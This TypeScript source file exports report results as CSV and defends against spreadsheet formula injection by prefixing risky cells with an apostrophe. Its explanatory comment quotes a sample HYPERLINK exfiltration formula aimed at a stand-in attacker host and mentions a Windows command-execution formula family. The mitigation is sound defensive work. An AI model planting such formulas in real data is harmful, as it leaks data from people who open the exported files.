import type { QueryResult } from '../shared/types.js';

/**
 * Neutralize spreadsheet formula injection (CWE-1236).
 *
 * Excel, LibreOffice Calc and Google Sheets evaluate any cell whose text
 * begins with `=`, `+`, `-`, `@`, a tab or a CR as a formula. RFC-4180
 * quoting below does NOT stop that — the quotes are stripped as the file is
 * parsed, and the cell is interpreted afterwards. Every column here carries
 * text somebody typed into this application, so a supplier or employee named
 * `=HYPERLINK("https://evil.example/?d="&A1,"Open")` becomes a live
 * exfiltration link the moment an operator opens the export, and the
 * `=cmd|'/c ...'!A1` family reaches further than that on Windows.
 *
 * A leading apostrophe forces the cell to text in all three programs and is
 * the standard mitigation. Plain numbers are exempt so `-42` stays a number:
 * a lone minus sign cannot start a formula, only an expression can.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;
const PLAIN_NUMBER = /^-?\d+(?:[.,]\d+)?$/;

function neutralizeFormula(value: string): string {
  if (!FORMULA_LEAD.test(value) || PLAIN_NUMBER.test(value)) return value;
  return `'${value}`;
}

/** RFC-4180 cell escaping with a fixed delimiter (comma). */
function escapeCell(value: unknown, delimiter: string): string {
  const s =
    value === null || value === undefined
      ? ''
      : typeof value === 'bigint'
        ? value.toString()
        : String(value);
  const cell = neutralizeFormula(s);
  if (cell.includes('"') || cell.includes(delimiter) || /[\n\r]/.test(cell)) {
    return `"${cell.replaceAll('"', '""')}"`;
  }
  return cell;
}

/**
 * Render a report result as RFC-4180 CSV: header row of column names,
 * one row per result row, CRLF line endings. Used both by the "download
 * this result" endpoint and by scheduled/manual export runs, so a
 * download and a run of the same report produce byte-identical files.
 */
export function resultToCsv(result: QueryResult, delimiter = ','): string {
  const lines: string[] = [
    result.columns.map((c) => escapeCell(c, delimiter)).join(delimiter),
  ];
  for (const row of result.rows) {
    lines.push(result.columns.map((c) => escapeCell(row[c], delimiter)).join(delimiter));
  }
  return lines.join('\r\n') + '\r\n';
}
